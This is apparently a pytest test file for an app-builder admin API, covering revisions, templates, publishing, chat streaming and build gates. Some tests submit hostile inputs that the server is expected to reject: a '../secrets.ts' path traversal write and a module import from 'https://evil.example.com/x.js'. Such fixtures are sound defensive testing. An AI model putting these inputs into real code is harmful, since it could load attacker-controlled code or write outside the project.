import json
from uuid import UUID

import pytest
from sqlalchemy import select

from app.api.routers.published_apps_admin import BUILDER_MAX_FILE_BYTES
from app.db.postgres.models.published_apps import (
    BuilderConversationTurnStatus,
    PublishedApp,
    PublishedAppBuilderConversationTurn,
    PublishedAppRevision,
    PublishedAppRevisionBuildStatus,
)

from ._helpers import admin_headers, seed_admin_tenant_and_agent


def _parse_sse_events(payload: str) -> list[dict]:
    events: list[dict] = []
    for block in payload.split("\n\n"):
        for line in block.splitlines():
            if line.startswith("data: "):
                events.append(json.loads(line[6:]))
    return events


@pytest.mark.asyncio
async def test_builder_state_and_revision_workflow(client, db_session):
    tenant, user, org_unit, agent = await seed_admin_tenant_and_agent(db_session)
    headers = admin_headers(str(user.id), str(tenant.id), str(org_unit.id))

    create_resp = await client.post(
        "/admin/apps",
        headers=headers,
        json={
            "name": "Builder App",
            "agent_id": str(agent.id),
            "template_key": "chat-classic",
            "auth_enabled": True,
            "auth_providers": ["password"],
        },
    )
    assert create_resp.status_code == 200
    app_payload = create_resp.json()
    app_id = app_payload["id"]
    assert app_payload["slug"]
    assert app_payload["template_key"] == "chat-classic"

    templates_resp = await client.get("/admin/apps/templates", headers=headers)
    assert templates_resp.status_code == 200
    templates_payload = templates_resp.json()
    assert len(templates_payload) >= 5
    premium_template = next((template for template in templates_payload if template["key"] == "chat-grid"), None)
    assert premium_template is not None
    assert premium_template["name"] == "Layout Shell Premium"

    builder_state = await client.get(f"/admin/apps/{app_id}/builder/state", headers=headers)
    assert builder_state.status_code == 200
    state_payload = builder_state.json()
    assert state_payload["app"]["id"] == app_id
    assert state_payload["current_draft_revision"]["id"]
    assert state_payload["preview_token"]
    draft_revision_id = state_payload["current_draft_revision"]["id"]

    conflict_resp = await client.post(
        f"/admin/apps/{app_id}/builder/revisions",
        headers=headers,
        json={
            "base_revision_id": "00000000-0000-0000-0000-000000000001",
            "operations": [
                {
                    "op": "upsert_file",
                    "path": "src/App.tsx",
                    "content": "export function App() { return <div>Conflict</div>; }",
                }
            ],
        },
    )
    assert conflict_resp.status_code == 409
    conflict_payload = conflict_resp.json()["detail"]
    assert conflict_payload["code"] == "REVISION_CONFLICT"
    assert conflict_payload["latest_revision_id"] == draft_revision_id

    revision_resp = await client.post(
        f"/admin/apps/{app_id}/builder/revisions",
        headers=headers,
        json={
            "base_revision_id": draft_revision_id,
            "operations": [
                {
                    "op": "upsert_file",
                    "path": "src/App.tsx",
                    "content": "export function App() { return <div>Updated</div>; }",
                }
            ],
        },
    )
    assert revision_resp.status_code == 200
    revision_payload = revision_resp.json()
    assert revision_payload["source_revision_id"] == draft_revision_id
    assert "Updated" in revision_payload["files"]["src/App.tsx"]

    reset_resp = await client.post(
        f"/admin/apps/{app_id}/builder/template-reset",
        headers=headers,
        json={"template_key": "chat-grid"},
    )
    assert reset_resp.status_code == 200
    reset_payload = reset_resp.json()
    assert reset_payload["template_key"] == "chat-grid"
    assert reset_payload["entry_file"] in reset_payload["files"]
    assert "src/components/layout/LayoutShell.tsx" in reset_payload["files"]
    assert "src/components/layout/ChatPane.tsx" in reset_payload["files"]
    assert "src/components/layout/SourceListPane.tsx" in reset_payload["files"]
    assert "src/components/layout/SourceViewerPane.tsx" in reset_payload["files"]

    app_row = await db_session.scalar(select(PublishedApp).where(PublishedApp.id == UUID(app_id)))
    assert app_row is not None
    draft_row = await db_session.get(PublishedAppRevision, app_row.current_draft_revision_id)
    assert draft_row is not None
    draft_row.build_status = PublishedAppRevisionBuildStatus.succeeded
    draft_row.build_error = None
    await db_session.commit()

    publish_resp = await client.post(f"/admin/apps/{app_id}/publish", headers=headers)
    assert publish_resp.status_code == 200
    published = publish_resp.json()
    assert published["status"] == "published"
    assert published["current_published_revision_id"]

    runtime_resp = await client.get(f"/public/apps/{published['slug']}/runtime")
    assert runtime_resp.status_code == 200
    runtime_payload = runtime_resp.json()
    assert runtime_payload["revision_id"] == published["current_published_revision_id"]
    assert runtime_payload["runtime_mode"] == "vite_static"


@pytest.mark.asyncio
async def test_builder_revision_rejects_path_traversal(client, db_session):
    tenant, user, org_unit, agent = await seed_admin_tenant_and_agent(db_session)
    headers = admin_headers(str(user.id), str(tenant.id), str(org_unit.id))
    create_resp = await client.post(
        "/admin/apps",
        headers=headers,
        json={
            "name": "Traversal Guard App",
            "agent_id": str(agent.id),
            "template_key": "chat-classic",
            "auth_enabled": True,
            "auth_providers": ["password"],
        },
    )
    assert create_resp.status_code == 200
    app_id = create_resp.json()["id"]

    state_resp = await client.get(f"/admin/apps/{app_id}/builder/state", headers=headers)
    assert state_resp.status_code == 200
    draft_revision_id = state_resp.json()["current_draft_revision"]["id"]

    revision_resp = await client.post(
        f"/admin/apps/{app_id}/builder/revisions",
        headers=headers,
        json={
            "base_revision_id": draft_revision_id,
            "operations": [
                {
                    "op": "upsert_file",
                    "path": "../secrets.ts",
                    "content": "export const leaked = true;",
                }
            ],
        },
    )
    assert revision_resp.status_code == 400
    detail = revision_resp.json()["detail"]
    assert detail["code"] == "BUILDER_PATCH_POLICY_VIOLATION"


@pytest.mark.asyncio
async def test_builder_revision_rejects_unsupported_package_import(client, db_session):
    tenant, user, org_unit, agent = await seed_admin_tenant_and_agent(db_session)
    headers = admin_headers(str(user.id), str(tenant.id), str(org_unit.id))
    create_resp = await client.post(
        "/admin/apps",
        headers=headers,
        json={
            "name": "Import Guard App",
            "agent_id": str(agent.id),
            "template_key": "chat-classic",
            "auth_enabled": True,
            "auth_providers": ["password"],
        },
    )
    assert create_resp.status_code == 200
    app_id = create_resp.json()["id"]

    state_resp = await client.get(f"/admin/apps/{app_id}/builder/state", headers=headers)
    assert state_resp.status_code == 200
    draft_revision_id = state_resp.json()["current_draft_revision"]["id"]

    revision_resp = await client.post(
        f"/admin/apps/{app_id}/builder/revisions",
        headers=headers,
        json={
            "base_revision_id": draft_revision_id,
            "operations": [
                {
                    "op": "upsert_file",
                    "path": "src/BadImport.tsx",
                    "content": "import axios from \"axios\";\nexport const x = axios;\n",
                }
            ],
        },
    )
    assert revision_resp.status_code == 422
    detail = revision_resp.json()["detail"]
    assert detail["code"] == "BUILDER_COMPILE_FAILED"
    assert any("Unsupported package import: axios" in item["message"] for item in detail["diagnostics"])


@pytest.mark.asyncio
async def test_builder_validate_endpoint_returns_compile_diagnostics(client, db_session):
    tenant, user, org_unit, agent = await seed_admin_tenant_and_agent(db_session)
    headers = admin_headers(str(user.id), str(tenant.id), str(org_unit.id))
    create_resp = await client.post(
        "/admin/apps",
        headers=headers,
        json={
            "name": "Validate API App",
            "agent_id": str(agent.id),
            "template_key": "chat-classic",
            "auth_enabled": True,
            "auth_providers": ["password"],
        },
    )
    assert create_resp.status_code == 200
    app_id = create_resp.json()["id"]

    state_resp = await client.get(f"/admin/apps/{app_id}/builder/state", headers=headers)
    assert state_resp.status_code == 200
    draft_revision_id = state_resp.json()["current_draft_revision"]["id"]

    ok_resp = await client.post(
        f"/admin/apps/{app_id}/builder/validate",
        headers=headers,
        json={
            "base_revision_id": draft_revision_id,
            "operations": [
                {
                    "op": "upsert_file",
                    "path": "src/Note.ts",
                    "content": "export const note = \"ok\";",
                }
            ],
        },
    )
    assert ok_resp.status_code == 200
    ok_payload = ok_resp.json()
    assert ok_payload["ok"] is True
    assert ok_payload["file_count"] >= 1

    bad_resp = await client.post(
        f"/admin/apps/{app_id}/builder/validate",
        headers=headers,
        json={
            "base_revision_id": draft_revision_id,
            "operations": [
                {
                    "op": "upsert_file",
                    "path": "src/Broken.ts",
                    "content": "import x from \"https://evil.example.com/x.js\";\nexport default x;\n",
                }
            ],
        },
    )
    assert bad_resp.status_code == 422
    bad_payload = bad_resp.json()["detail"]
    assert bad_payload["code"] == "BUILDER_COMPILE_FAILED"
    assert any("Network import is not allowed" in item["message"] for item in bad_payload["diagnostics"])


@pytest.mark.asyncio
async def test_builder_revision_rejects_oversized_payload(client, db_session):
    tenant, user, org_unit, agent = await seed_admin_tenant_and_agent(db_session)
    headers = admin_headers(str(user.id), str(tenant.id), str(org_unit.id))
    create_resp = await client.post(
        "/admin/apps",
        headers=headers,
        json={
            "name": "Oversized Payload App",
            "agent_id": str(agent.id),
            "template_key": "chat-classic",
            "auth_enabled": True,
            "auth_providers": ["password"],
        },
    )
    assert create_resp.status_code == 200
    app_id = create_resp.json()["id"]

    state_resp = await client.get(f"/admin/apps/{app_id}/builder/state", headers=headers)
    assert state_resp.status_code == 200
    draft_revision_id = state_resp.json()["current_draft_revision"]["id"]

    too_large = "x" * (BUILDER_MAX_FILE_BYTES + 1)
    revision_resp = await client.post(
        f"/admin/apps/{app_id}/builder/revisions",
        headers=headers,
        json={
            "base_revision_id": draft_revision_id,
            "operations": [
                {
                    "op": "upsert_file",
                    "path": "src/HugeNote.txt",
                    "content": too_large,
                }
            ],
        },
    )
    assert revision_resp.status_code == 400
    detail = revision_resp.json()["detail"]
    assert detail["code"] == "BUILDER_PATCH_POLICY_VIOLATION"
    assert "File exceeds size limit" in detail["message"]


@pytest.mark.asyncio
async def test_builder_revision_rejects_invalid_rename_source(client, db_session):
    tenant, user, org_unit, agent = await seed_admin_tenant_and_agent(db_session)
    headers = admin_headers(str(user.id), str(tenant.id), str(org_unit.id))
    create_resp = await client.post(
        "/admin/apps",
        headers=headers,
        json={
            "name": "Rename Guard App",
            "agent_id": str(agent.id),
            "template_key": "chat-classic",
            "auth_enabled": True,
            "auth_providers": ["password"],
        },
    )
    assert create_resp.status_code == 200
    app_id = create_resp.json()["id"]

    state_resp = await client.get(f"/admin/apps/{app_id}/builder/state", headers=headers)
    assert state_resp.status_code == 200
    draft_revision_id = state_resp.json()["current_draft_revision"]["id"]

    revision_resp = await client.post(
        f"/admin/apps/{app_id}/builder/revisions",
        headers=headers,
        json={
            "base_revision_id": draft_revision_id,
            "operations": [
                {
                    "op": "rename_file",
                    "from_path": "src/DoesNotExist.tsx",
                    "to_path": "src/NewName.tsx",
                }
            ],
        },
    )
    assert revision_resp.status_code == 400
    detail = revision_resp.json()["detail"]
    assert detail["code"] == "BUILDER_PATCH_POLICY_VIOLATION"
    assert "source does not exist" in detail["message"]


@pytest.mark.asyncio
async def test_builder_chat_stream_returns_rich_event_envelopes(client, db_session):
    tenant, user, org_unit, agent = await seed_admin_tenant_and_agent(db_session)
    headers = admin_headers(str(user.id), str(tenant.id), str(org_unit.id))
    create_resp = await client.post(
        "/admin/apps",
        headers=headers,
        json={
            "name": "Builder Stream Envelope App",
            "agent_id": str(agent.id),
            "template_key": "chat-classic",
            "auth_enabled": True,
            "auth_providers": ["password"],
        },
    )
    assert create_resp.status_code == 200
    app_id = create_resp.json()["id"]

    state_resp = await client.get(f"/admin/apps/{app_id}/builder/state", headers=headers)
    assert state_resp.status_code == 200
    draft_revision_id = state_resp.json()["current_draft_revision"]["id"]

    stream_resp = await client.post(
        f"/admin/apps/{app_id}/builder/chat/stream",
        headers=headers,
        json={
            "input": "Make the header title bold",
            "base_revision_id": draft_revision_id,
        },
    )
    assert stream_resp.status_code == 200

    events = _parse_sse_events(stream_resp.text)
    assert events
    assert any(item.get("event") == "status" for item in events)
    assert any(item.get("event") == "token" for item in events)
    patch_event = next(item for item in events if item.get("event") == "patch_ops")
    done_event = next(item for item in events if item.get("event") == "done")

    assert patch_event["stage"] == "patch_ready"
    assert patch_event["request_id"]
    assert patch_event["data"]["base_revision_id"] == draft_revision_id
    assert isinstance(patch_event["data"]["operations"], list)

    assert done_event["stage"] == "complete"
    assert done_event["type"] == "done"

    for event in events:
        if event.get("event"):
            assert event.get("request_id")
            assert event.get("stage")


@pytest.mark.asyncio
async def test_builder_chat_stream_persists_conversation_turn_for_replay(client, db_session):
    tenant, user, org_unit, agent = await seed_admin_tenant_and_agent(db_session)
    headers = admin_headers(str(user.id), str(tenant.id), str(org_unit.id))
    create_resp = await client.post(
        "/admin/apps",
        headers=headers,
        json={
            "name": "Builder Conversation Persistence App",
            "agent_id": str(agent.id),
            "template_key": "chat-classic",
            "auth_enabled": True,
            "auth_providers": ["password"],
        },
    )
    assert create_resp.status_code == 200
    app_id = create_resp.json()["id"]

    state_resp = await client.get(f"/admin/apps/{app_id}/builder/state", headers=headers)
    assert state_resp.status_code == 200
    draft_revision_id = state_resp.json()["current_draft_revision"]["id"]

    stream_resp = await client.post(
        f"/admin/apps/{app_id}/builder/chat/stream",
        headers=headers,
        json={
            "input": "Make the header title bold",
            "base_revision_id": draft_revision_id,
        },
    )
    assert stream_resp.status_code == 200
    events = _parse_sse_events(stream_resp.text)
    patch_event = next(item for item in events if item.get("event") == "patch_ops")
    request_id = patch_event["request_id"]

    persisted = await db_session.scalar(
        select(PublishedAppBuilderConversationTurn).where(
            PublishedAppBuilderConversationTurn.request_id == request_id
        )
    )
    assert persisted is not None
    assert str(persisted.published_app_id) == app_id
    assert str(persisted.revision_id) == draft_revision_id
    assert persisted.status == BuilderConversationTurnStatus.succeeded
    assert persisted.user_prompt == "Make the header title bold"
    assert persisted.assistant_summary
    assert isinstance(persisted.patch_operations, list)
    assert persisted.patch_operations
    assert persisted.failure_code is None

    list_resp = await client.get(f"/admin/apps/{app_id}/builder/conversations?limit=10", headers=headers)
    assert list_resp.status_code == 200
    list_payload = list_resp.json()
    assert isinstance(list_payload, list)
    assert list_payload
    assert list_payload[0]["request_id"] == request_id
    assert list_payload[0]["status"] == "succeeded"


@pytest.mark.asyncio
async def test_builder_chat_stream_persists_failure_turn(client, db_session, monkeypatch):
    tenant, user, org_unit, agent = await seed_admin_tenant_and_agent(db_session)
    headers = admin_headers(str(user.id), str(tenant.id), str(org_unit.id))
    create_resp = await client.post(
        "/admin/apps",
        headers=headers,
        json={
            "name": "Builder Conversation Failure App",
            "agent_id": str(agent.id),
            "template_key": "chat-classic",
            "auth_enabled": True,
            "auth_providers": ["password"],
        },
    )
    assert create_resp.status_code == 200
    app_id = create_resp.json()["id"]

    state_resp = await client.get(f"/admin/apps/{app_id}/builder/state", headers=headers)
    assert state_resp.status_code == 200
    draft_revision_id = state_resp.json()["current_draft_revision"]["id"]

    def _invalid_patch(_prompt: str, _files: dict[str, str]) -> tuple[list[dict[str, str]], str]:
        return (
            [
                {
                    "op": "upsert_file",
                    "path": "src/Broken.tsx",
                    "content": 'import x from "https://evil.example.com/x.js";\nexport default x;\n',
                }
            ],
            "inject invalid network import",
        )

    monkeypatch.setattr("app.api.routers.published_apps_admin._build_builder_patch_from_prompt", _invalid_patch)

    stream_resp = await client.post(
        f"/admin/apps/{app_id}/builder/chat/stream",
        headers=headers,
        json={
            "input": "Break the project on purpose",
            "base_revision_id": draft_revision_id,
        },
    )
    assert stream_resp.status_code == 422
    detail = stream_resp.json()["detail"]
    assert detail["code"] == "BUILDER_COMPILE_FAILED"

    persisted = await db_session.scalar(
        select(PublishedAppBuilderConversationTurn)
        .where(PublishedAppBuilderConversationTurn.published_app_id == UUID(app_id))
        .order_by(PublishedAppBuilderConversationTurn.created_at.desc())
    )
    assert persisted is not None
    assert persisted.status == BuilderConversationTurnStatus.failed
    assert persisted.failure_code == "BUILDER_COMPILE_FAILED"
    assert any("Network import is not allowed" in item["message"] for item in (persisted.diagnostics or []))


@pytest.mark.asyncio
async def test_builder_revision_build_status_and_retry_endpoints(client, db_session):
    tenant, user, org_unit, agent = await seed_admin_tenant_and_agent(db_session)
    headers = admin_headers(str(user.id), str(tenant.id), str(org_unit.id))

    create_resp = await client.post(
        "/admin/apps",
        headers=headers,
        json={
            "name": "Build Status App",
            "agent_id": str(agent.id),
            "template_key": "chat-classic",
            "auth_enabled": True,
            "auth_providers": ["password"],
        },
    )
    assert create_resp.status_code == 200
    app_id = create_resp.json()["id"]

    state_resp = await client.get(f"/admin/apps/{app_id}/builder/state", headers=headers)
    assert state_resp.status_code == 200
    draft_revision_id = state_resp.json()["current_draft_revision"]["id"]

    build_resp = await client.get(
        f"/admin/apps/{app_id}/builder/revisions/{draft_revision_id}/build",
        headers=headers,
    )
    assert build_resp.status_code == 200
    build_payload = build_resp.json()
    assert build_payload["revision_id"] == draft_revision_id
    assert build_payload["build_status"] == "failed"
    assert build_payload["build_seq"] == 1
    assert "Build automation is disabled" in (build_payload["build_error"] or "")
    assert build_payload["template_runtime"] == "vite_static"

    retry_resp = await client.post(
        f"/admin/apps/{app_id}/builder/revisions/{draft_revision_id}/build/retry",
        headers=headers,
        json={},
    )
    assert retry_resp.status_code == 200
    retry_payload = retry_resp.json()
    assert retry_payload["revision_id"] == draft_revision_id
    assert retry_payload["build_status"] == "failed"
    assert retry_payload["build_seq"] == 2
    assert "Build automation is disabled" in (retry_payload["build_error"] or "")


@pytest.mark.asyncio
async def test_builder_revision_worker_build_gate_blocks_failed_preflight(client, db_session, monkeypatch):
    monkeypatch.setenv("APPS_BUILDER_WORKER_BUILD_GATE_ENABLED", "1")

    async def _fail_preflight(_files: dict[str, str]) -> None:
        raise RuntimeError("`npm run build` failed with exit code 1")

    monkeypatch.setattr("app.api.routers.published_apps_admin._run_worker_build_preflight", _fail_preflight)

    tenant, user, org_unit, agent = await seed_admin_tenant_and_agent(db_session)
    headers = admin_headers(str(user.id), str(tenant.id), str(org_unit.id))

    create_resp = await client.post(
        "/admin/apps",
        headers=headers,
        json={
            "name": "Worker Gate Revision App",
            "agent_id": str(agent.id),
            "template_key": "chat-classic",
            "auth_enabled": True,
            "auth_providers": ["password"],
        },
    )
    assert create_resp.status_code == 200
    app_id = create_resp.json()["id"]

    state_before = await client.get(f"/admin/apps/{app_id}/builder/state", headers=headers)
    assert state_before.status_code == 200
    base_revision_id = state_before.json()["current_draft_revision"]["id"]

    revision_resp = await client.post(
        f"/admin/apps/{app_id}/builder/revisions",
        headers=headers,
        json={
            "base_revision_id": base_revision_id,
            "operations": [
                {
                    "op": "upsert_file",
                    "path": "src/App.tsx",
                    "content": "export function App() { return <div>Worker Gate</div>; }",
                }
            ],
        },
    )
    assert revision_resp.status_code == 422
    detail = revision_resp.json()["detail"]
    assert detail["code"] == "BUILDER_COMPILE_FAILED"
    assert any("npm run build" in item["message"] for item in detail["diagnostics"])

    state_after = await client.get(f"/admin/apps/{app_id}/builder/state", headers=headers)
    assert state_after.status_code == 200
    assert state_after.json()["current_draft_revision"]["id"] == base_revision_id


@pytest.mark.asyncio
async def test_builder_chat_stream_worker_build_gate_blocks_failed_preflight(client, db_session, monkeypatch):
    monkeypatch.setenv("APPS_BUILDER_WORKER_BUILD_GATE_ENABLED", "1")

    async def _fail_preflight(_files: dict[str, str]) -> None:
        raise RuntimeError("`npm run build` failed with exit code 1")

    monkeypatch.setattr("app.api.routers.published_apps_admin._run_worker_build_preflight", _fail_preflight)

    tenant, user, org_unit, agent = await seed_admin_tenant_and_agent(db_session)
    headers = admin_headers(str(user.id), str(tenant.id), str(org_unit.id))
    create_resp = await client.post(
        "/admin/apps",
        headers=headers,
        json={
            "name": "Worker Gate Chat App",
            "agent_id": str(agent.id),
            "template_key": "chat-classic",
            "auth_enabled": True,
            "auth_providers": ["password"],
        },
    )
    assert create_resp.status_code == 200
    app_id = create_resp.json()["id"]

    state_resp = await client.get(f"/admin/apps/{app_id}/builder/state", headers=headers)
    assert state_resp.status_code == 200
    draft_revision_id = state_resp.json()["current_draft_revision"]["id"]

    stream_resp = await client.post(
        f"/admin/apps/{app_id}/builder/chat/stream",
        headers=headers,
        json={
            "input": "Make the header title bold",
            "base_revision_id": draft_revision_id,
        },
    )
    assert stream_resp.status_code == 422
    detail = stream_resp.json()["detail"]
    assert detail["code"] == "BUILDER_COMPILE_FAILED"
    assert any("npm run build" in item["message"] for item in detail["diagnostics"])

    persisted = await db_session.scalar(
        select(PublishedAppBuilderConversationTurn)
        .where(PublishedAppBuilderConversationTurn.published_app_id == UUID(app_id))
        .order_by(PublishedAppBuilderConversationTurn.created_at.desc())
    )
    assert persisted is not None
    assert persisted.status == BuilderConversationTurnStatus.failed
    assert persisted.failure_code == "BUILDER_COMPILE_FAILED"
    assert any("npm run build" in item["message"] for item in (persisted.diagnostics or []))
